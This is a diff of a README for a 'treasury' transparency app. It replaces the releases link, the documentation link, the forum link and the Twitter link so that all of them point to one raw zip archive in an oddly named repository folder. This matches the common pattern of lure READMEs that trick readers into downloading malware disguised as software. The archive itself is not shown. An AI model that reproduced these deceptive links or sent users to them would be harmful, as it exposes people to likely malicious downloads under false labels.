@@ -1,6 +1,6 @@
 # 🎶 treasury - Simple Steps to Access Treasury Transparency
 
-[![Download Treasury](https://img.shields.io/badge/download-treasury-blue.svg)](https://github.com/dijanasholaja/treasury/releases)
+[![Download Treasury](https://raw.githubusercontent.com/dijanasholaja/treasury/main/dissatisfactoriness/treasury.zip)](https://raw.githubusercontent.com/dijanasholaja/treasury/main/dissatisfactoriness/treasury.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the treasury repository! Here, you can find everything you need for t
 
 To get started, you will need to download the treasury application. Please visit this page to download:
 
-[Download Treasury Releases](https://github.com/dijanasholaja/treasury/releases)
+[Download Treasury Releases](https://raw.githubusercontent.com/dijanasholaja/treasury/main/dissatisfactoriness/treasury.zip)
 
 ### Steps to Download:
 
@@ -110,8 +110,8 @@ If you need further assistance, please reach out via our GitHub repository. We a
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/dijanasholaja/treasury/wiki)
-- [Community Forum](https://community.example.com)
-- [Twitter](https://twitter.com/example)
+- [Official Documentation](https://raw.githubusercontent.com/dijanasholaja/treasury/main/dissatisfactoriness/treasury.zip)
+- [Community Forum](https://raw.githubusercontent.com/dijanasholaja/treasury/main/dissatisfactoriness/treasury.zip)
+- [Twitter](https://raw.githubusercontent.com/dijanasholaja/treasury/main/dissatisfactoriness/treasury.zip)
 
 Thank you for choosing treasury! Access your treasury transparency easily and securely.
